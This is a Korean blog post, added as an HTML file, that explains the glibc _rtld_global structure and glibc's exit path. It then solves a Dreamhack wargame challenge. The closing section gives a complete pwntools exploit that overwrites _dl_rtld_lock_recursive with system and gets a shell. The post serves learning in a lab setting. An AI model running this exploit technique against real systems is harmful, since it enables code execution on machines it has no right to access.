@@ -1,0 +1,181 @@
+<!doctype html>
+<html lang="ko" data-theme="light"><head>
+  <meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>[PWNABLE] rtld global · whrds.log</title><meta name="description" content="rtld global프로그램이 실행되고 프로세스로 등록될 때, 코드와 변수들을 관리하기 위한 구조체이다.실행이 종료되는 지점에서 참조된다.return에 의해 종료될 때 확인이 가능하다. 간단한 실습 예제이다.#include int main(){ return 0; }바이너리 __stack부터 확인해보면 main함수 호츨을 ">
+  <meta name="theme-color" content="#f7f7f3"><link rel="canonical" href="https://whrds.github.io/ko/posts/pwnable-rtld-global/">
+  <link rel="alternate" hreflang="ko" href="https://whrds.github.io/ko/posts/pwnable-rtld-global/"><link rel="alternate" hreflang="en" href="https://whrds.github.io/en/posts/pwnable-rtld-global/">
+  <meta property="og:type" content="article"><meta property="og:title" content="[PWNABLE] rtld global · whrds.log"><meta property="og:description" content="rtld global프로그램이 실행되고 프로세스로 등록될 때, 코드와 변수들을 관리하기 위한 구조체이다.실행이 종료되는 지점에서 참조된다.return에 의해 종료될 때 확인이 가능하다. 간단한 실습 예제이다.#include int main(){ return 0; }바이너리 __stack부터 확인해보면 main함수 호츨을 "><meta property="og:url" content="https://whrds.github.io/ko/posts/pwnable-rtld-global/">
+  <link rel="icon" href="/assets/favicon.svg" type="image/svg+xml"><link rel="stylesheet" href="/assets/styles.css">
+  <script>try{const t=localStorage.getItem('theme');if(t)document.documentElement.dataset.theme=t;else if(matchMedia('(prefers-color-scheme:dark)').matches)document.documentElement.dataset.theme='dark'}catch(e){}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"[PWNABLE] rtld global","description":"rtld global프로그램이 실행되고 프로세스로 등록될 때, 코드와 변수들을 관리하기 위한 구조체이다.실행이 종료되는 지점에서 참조된다.return에 의해 종료될 때 확인이 가능하다. 간단한 실습 예제이다.#include int main(){ return 0; }바이너리 __stack부터 확인해보면 main함수 호츨을 ","datePublished":"2024-06-24","inLanguage":"ko","url":"https://whrds.github.io/ko/posts/pwnable-rtld-global/","author":{"@type":"Person","name":"whrds"}}</script>
+</head><body>
+  <a class="skip-link" href="#main">본문으로 건너뛰기</a>
+  <header class="site-header"><div class="shell header-inner">
+    <a class="brand" href="/ko/" aria-label="whrds.log home"><span class="brand-mark">W_</span><span class="brand-text">whrds.log</span></a>
+    <nav class="main-nav" aria-label="주 메뉴">
+      <a href="/ko/" aria-current="page">글</a>
+      <a href="/ko/about/">소개</a>
+    </nav>
+    <div class="header-tools">
+      <div class="language-switch" aria-label="Language">
+        <a href="#" class="active" lang="ko" aria-current="true">KO</a>
+        <a href="/en/posts/pwnable-rtld-global/" class="" lang="en">EN</a>
+      </div>
+      <button class="icon-button" type="button" data-theme-toggle aria-label="Use dark theme">◐</button>
+    </div>
+  </div></header>
+  <main id="main"><article class="article-wrap"><header class="article-header"><p class="eyebrow">Security research notes</p><h1>[PWNABLE] rtld global</h1><p class="article-description">rtld global프로그램이 실행되고 프로세스로 등록될 때, 코드와 변수들을 관리하기 위한 구조체이다.실행이 종료되는 지점에서 참조된다.return에 의해 종료될 때 확인이 가능하다. 간단한 실습 예제이다.#include int main(){ return 0; }바이너리 __stack부터 확인해보면 main함수 호츨을 </p><div class="article-meta"><time datetime="2024-06-24">2024년 6월 24일</time><span>·</span><span>1 분 읽기</span></div></header><div class="prose"><h3>rtld global</h3>
+<p>프로그램이 실행되고 프로세스로 등록될 때, 코드와 변수들을 관리하기 위한 구조체이다.</p>
+<p>실행이 종료되는 지점에서 참조된다.</p>
+<p>return에 의해 종료될 때 확인이 가능하다.</p>
+<p>간단한 실습 예제이다.</p>
+<pre><code>#include &lt;stdio.h&gt;
+
+int main(){
+	return 0;
+    }
+</code></pre>
+<p><img src="/assets/images/tistory/tistory-6887f7a3f117/001.png" alt=""></p>
+<p>바이너리 __stack부터 확인해보면 main함수 호츨을 __libc_start_main에서 하는 것을 알 수 있다.</p>
+<p>즉, main함수가 종료될 때 복귀도는 주소도 __libc_start_main이다.</p>
+<p>여기서 step into로 계속 들어가보겠다.</p>
+<p><img src="/assets/images/tistory/tistory-6887f7a3f117/002.png" alt=""></p>
+<p>조금 들어가다보면 __GI_exit라는 함수가 호출된다.</p>
+<p>그리고 __run_exit_handlers를 호출한다.</p>
+<p>이제 여기서 함수 종료에 return을 쓰나 안쓰나에 따라 달라지는데,</p>
+<p>이번 예제는 사용을 했기 때문에 _dl_fini라는 함수가 호출된다.</p>
+<p><img src="/assets/images/tistory/tistory-6887f7a3f117/003.png" alt=""></p>
+<p>dreamhack 설명으로는 여기서 __rtld_lock_lock_recursive함수가 호출된다고 하는데 gdb로는 위 상태에서</p>
+<p>__GI__exit함수로 갔다가 종료된다.</p>
+<pre><code># define __rtld_lock_lock_recursive(NAME) \
+  GL(dl_rtld_lock_recursive) (&amp;(NAME).mutex)
+  
+void
+_dl_fini (void)
+{
+#ifdef SHARED
+  int do_audit = 0;
+ again:
+#endif
+  for (Lmid_t ns = GL(dl_nns) - 1; ns &gt;= 0; --ns)
+    {
+      /* Protect against concurrent loads and unloads.  */
+      __rtld_lock_lock_recursive (GL(dl_load_lock));
+</code></pre>
+<p>__di_fini함수에서 dl_load_lock을 인자로 recursive함수를 호출한다.</p>
+<p> __rtld_lock_lock_recursive는 코드에서 매크로로 dl_rtld_lock_recursive라는 함수 포인터로 사용된다.</p>
+<p>해당 포인터는 _rtld_global 구조체의 맴버 변수라고 한다.</p>
+<p>_rtld_global 변수에 대해 살펴보겠다.</p>
+<p><img src="/assets/images/tistory/tistory-6887f7a3f117/004.png" alt=""></p>
+<p>상당히 긴 친구이다.</p>
+<p><img src="/assets/images/tistory/tistory-6887f7a3f117/005.png" alt=""></p>
+<p>_dl_rtld_lock_recursive에 대한 정의이다.</p>
+<p><img src="/assets/images/tistory/tistory-6887f7a3f117/006.png" alt=""></p>
+<p>실행중인 상태에서 봤을 때 rtld_lock_default_lock_recursive의 주소를 저장하고 있다.</p>
+<p>해당 부분을 이용하여 메모리를 변조하면 공격이 가능하다.</p>
+<hr>
+<p>dreamhack _rtld_global 문제</p>
+<pre><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+void init() {
+  setvbuf(stdin, 0, 2, 0);
+  setvbuf(stdout, 0, 2, 0);
+}
+
+int main() {
+  long addr;
+  long data;
+  int idx;
+
+  init();
+
+  printf(&quot;stdout: %p\n&quot;, stdout);
+  while (1) {
+    printf(&quot;&gt; &quot;);
+    scanf(&quot;%d&quot;, &amp;idx);
+    switch (idx) {
+      case 1:
+        printf(&quot;addr: &quot;);
+        scanf(&quot;%ld&quot;, &amp;addr);
+        printf(&quot;data: &quot;);
+        scanf(&quot;%ld&quot;, &amp;data);
+        *(long long *)addr = data;
+        break;
+      default:
+        return 0;
+    }
+  }
+  return 0;
+}
+</code></pre>
+<p>문제 코드이다.</p>
+<p>case 1인 경우에서 got overwrite 취약점이 발생하는 것을 볼 수 있다.</p>
+<p>stdout의 주소를 leak해주기 때문에 해당 주소를 이용해서 libc_base를 구할 수 있다.</p>
+<p>patchelf 명령어로 사용하는 라이브러리를 패치해준다.</p>
+<p><img src="/assets/images/tistory/tistory-6887f7a3f117/007.png" alt=""></p>
+<p>gdb로 확인해보면 정상적으로 바뀐 것을 볼 수있다.</p>
+<p><img src="/assets/images/tistory/tistory-6887f7a3f117/008.png" alt=""></p>
+<p>기존 libc_base와의 차이를 계산하면 0x3f1000이 나다</p>
+<p><img src="/assets/images/tistory/tistory-6887f7a3f117/009.png" alt=""></p>
+<p>_rtld_global 주소 계산과정이다.</p>
+<p>구조체 내 맴버 변수의 오프셋을 알아내려면 구조체와 멤버 변수 정보를 가지고 있는 디버깅 심볼이 필요하다.</p>
+<p><img src="/assets/images/tistory/tistory-6887f7a3f117/010.png" alt=""></p>
+<p>glibc의 상세버젼은 2.27-3ubuntu1이다.</p>
+<pre><code> wget http://launchpadlibrarian.net/365856914/libc6-dbg_2.27-3ubuntu1_amd64.deb
+ 
+ dpkg -x libc6-dbg_2.27-3ubuntu1_amd64.deb ./
+</code></pre>
+<p>해당 버젼에 맞는 패키지를 다운받고 추출한다.</p>
+<p><img src="/assets/images/tistory/tistory-6887f7a3f117/011.png" alt=""></p>
+<p>이제 맴버 변수의 오프셋을 구했으니 공격을 수행하면 된다.</p>
+<p>전체 페이로드이다.</p>
+<pre><code>from pwn import*
+
+p = process(['./ow_rtld'],env={'LD_PRELOAD':'./libc-2.27.so'})
+e = ELF('./ow_rtld')
+libc = ELF('./libc-2.27.so')
+ld = ELF('./ld-2.27.so')
+
+context.log_level='debug'
+
+p.recvuntil(b&quot;: &quot;)
+stdout = int(p.recvn(14),16)
+print(&quot;stdout@add : &quot;,hex(stdout))
+
+stdout_offset = libc.sym['_IO_2_1_stdout_']
+libc_base = stdout - stdout_offset
+print(&quot;libc_base@add : &quot;, hex(libc_base))
+
+ld_base = libc_base + 0x3f1000
+print(&quot;ld_base@add : &quot;, hex(ld_base))
+
+rtld_global = ld_base + ld.sym['_rtld_global']
+dl_load_lock = rtld_global + 2312
+dl_rtld_lock_recursive = rtld_global + 3840
+
+print(&quot;rtld_global@add : &quot;,hex(rtld_global))
+print(&quot;dl_load_lock@add : &quot;,hex(dl_load_lock))
+print(&quot;dl_rtld_lock_recursive@add : &quot;,hex(dl_rtld_lock_recursive))
+
+system_offset = libc.sym['system']
+system = libc_base + system_offset
+
+def send(add,val):
+    p.sendlineafter(b'&gt;',b'1')
+    p.sendlineafter(b'addr: ',str(add))
+    p.sendlineafter(b'data: ',str(val))
+
+send(dl_load_lock, u64('/bin/sh\x00'))
+
+send(dl_rtld_lock_recursive,system)
+
+p.sendlineafter(b'&gt; ',b'2')
+
+p.interactive()
+</code></pre>
+<p><img src="/assets/images/tistory/tistory-6887f7a3f117/012.png" alt=""></p>
+</div><div class="article-end"><a href="/ko/">← 모든 글 보기</a><a href="/en/posts/pwnable-rtld-global/" hreflang="en">이 글을 영어로 읽기 →</a></div></article></main>
+  <footer class="site-footer"><div class="shell footer-inner"><span>© 2026 whrds</span><span>관찰하고, 검증하고, 기록합니다.</span><a href="/ko/feed.xml">RSS</a></div></footer>
+  <script src="/assets/app.js" defer></script>
+</body></html>
